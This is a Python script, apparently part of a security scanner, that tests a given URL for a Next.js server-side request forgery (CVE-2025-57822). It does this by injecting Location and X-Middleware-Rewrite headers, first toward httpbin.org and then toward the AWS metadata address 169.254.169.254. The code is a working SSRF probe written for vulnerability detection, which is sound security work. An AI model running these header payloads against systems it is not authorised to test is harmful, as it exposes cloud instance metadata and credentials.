#!/usr/bin/env python3

"""
CVE-2025-57822

https://x.com/intigriti/status/1977662600977465794
"""


from utils.style import Colors, Identify
from utils.utils import configure_logger, requests, sys

logger = configure_logger(__name__)


def nextjs_ssrf(url: str) -> None:
    """
    Teste CVE-2025-57822 (Next.js SSRF via Location/X-Middleware-Rewrite headers)
    
    Args:
        url: URL cible
    """
    s = requests.Session()
    s.headers.update({
        "User-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
    })
    
    # URL de test externe pour vérifier le SSRF
    test_url = "https://httpbin.org/status/418"
    test_marker = "teapot"  # Réponse unique du status 418
    
    # Différentes combinaisons de headers à tester
    headers_payload = [
        {"Location": test_url},
        {"X-Middleware-Rewrite": test_url},
        {
            "Location": test_url,
            "X-Middleware-Rewrite": test_url
        }
    ]
    
    for payload in headers_payload:
        try:
            req_ssrf = s.get(
                url,
                headers=payload,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            
            # Vérifier si le marqueur unique est présent (indiquant SSRF)
            if test_marker in req_ssrf.text.lower():
                print(
                    f" {Identify.confirmed} | CVE-2025-57822 | SSRF | "
                    f"{Colors.BLUE}{url}{Colors.RESET} | "
                    f"PAYLOAD: {payload}"
                )
                
                # Test supplémentaire avec un autre endpoint
                internal_test = payload.copy()
                internal_test_url = "http://169.254.169.254/latest/meta-data/"
                
                for key in internal_test:
                    internal_test[key] = internal_test_url
                
                try:
                    req_internal = s.get(
                        url,
                        headers=internal_test,
                        verify=False,
                        timeout=5,
                        allow_redirects=False
                    )
                    
                    # Vérifier si on obtient des métadonnées AWS (preuve de SSRF interne)
                    if any(keyword in req_internal.text.lower() for keyword in ["ami-id", "instance-id", "hostname"]):
                        print(
                            f" {Identify.confirmed} | CVE-2025-57822 | INTERNAL SSRF | "
                            f"{Colors.BLUE}{url}{Colors.RESET} | "
                            f"Can access cloud metadata"
                        )
                except:
                    pass
                    
        except requests.Timeout:
            logger.debug(f"Timeout testing {url} with payload {payload}")
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except requests.exceptions.InvalidHeader:
            logger.debug(f"Invalid header in payload: {payload}")
        except Exception as e:
            logger.debug(f"Error testing SSRF: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python CVE202557822.py <URL>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    nextjs_ssrf(target_url)